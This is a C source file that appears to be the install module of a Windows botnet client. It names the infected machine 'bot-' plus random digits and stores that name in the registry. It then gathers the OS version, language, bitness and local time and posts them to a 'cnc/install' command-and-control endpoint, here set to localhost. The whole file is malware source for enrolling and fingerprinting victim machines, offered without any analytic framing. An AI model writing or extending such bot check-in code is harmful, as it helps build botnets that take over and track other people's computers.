#include "install.h"

#include "registry.h"
#include "httpclient.h"
#include "helper.h"

#include <Windows.h>

char g_name[2048];

void sendInstallInfo()
{
	// Create a buffer to send
	char buffer[4096]; // up to 4kb of info

	// bot name
	strcpy(buffer, "name=");
	strcat(buffer, g_name);
	strcat(buffer, "&");

	// bot group
	strcat(buffer, "group=");
	strcat(buffer, VERSION_GROUP);
	strcat(buffer, "&");

	// version
	strcat(buffer, "version=");
	strcat(buffer, VERSION_NUMBER);
	strcat(buffer, "&");

	// os version
	strcat(buffer, "osversion=");
	RTL_OSVERSIONINFOEXW osVer;
	GetOsVersion(&osVer);
	if (osVer.dwMajorVersion == 6) {
		if (osVer.dwMinorVersion == 0) {
			strcat(buffer, "Windows Vista");
		}
		else if (osVer.dwMinorVersion == 1) {
			strcat(buffer, "Windows 7");
		}
		else if (osVer.dwMinorVersion == 2) {
			strcat(buffer, "Windows 8");
		}
		else if (osVer.dwMinorVersion == 3) {
			strcat(buffer, "Windows 8.1");
		}
	}
	else if (osVer.dwMajorVersion == 5) {
		if (osVer.dwMinorVersion == 0) {
			strcat(buffer, "Windows 2000");
		}
		else if (osVer.dwMinorVersion == 1) {
			strcat(buffer, "Windows XP");
		}
	}
	strcat(buffer, " ");
	char szcsdversion[1024];
	wcstombs(szcsdversion, osVer.szCSDVersion, 1024);
	strcat(buffer, szcsdversion);
	strcat(buffer, " build ");
	char numBuf[1024];
	_itoa(osVer.dwBuildNumber, numBuf, 10);
	strcat(buffer, numBuf);
    strcat(buffer, "&");

	// os language
	strcat(buffer, "language=");
	LANGID id = GetUserDefaultUILanguage();
	_itoa(id, numBuf, 10);
	strcat(buffer, numBuf);
	strcat(buffer, "&");

	// os bitage
	strcat(buffer, "bits=");
	BOOL is64;
	IsWow64Process(GetCurrentProcess(), &is64);
	if (is64 == TRUE)
		strcat(buffer, "64-bit");
	else
		strcat(buffer, "32-bit");
	strcat(buffer, "&");

	// local time
	strcat(buffer, "localtime=");
	SYSTEMTIME localTime;
	GetLocalTime(&localTime);
	sprintf(numBuf, "%02d.%02d.%04d %02d:%02d:%02d", localTime.wDay, localTime.wMonth, localTime.wYear, localTime.wHour, localTime.wMinute, localTime.wSecond);
	strcat(buffer, numBuf);

	postUrl("http://localhost:3000/cnc/install", buffer);
}

void generateInstallInfo()
{
	char * ret = (char*)malloc(128 * sizeof(char));
	strcpy(ret, "");
	char * value = readRegStr("Name", ret);
	if (strcmp(value, "") == 0)
	{	
		// create a random name
		char s[17];
		static const char num[] = "0123456789";
		for (int i = 0; i < 16; ++i) {
			s[i] = num[rand() % (sizeof(num) - 1)];
		}
		s[16] = 0;
		char botName[128];
		strcpy(botName, "bot-");
		strcat(botName, s);
		writeRegStr("Name", botName);
		strcpy(g_name, botName);

		sendInstallInfo(); // send after we generate
	}
	else
	{
		strcpy(g_name, value);
	}
	free(value);
}
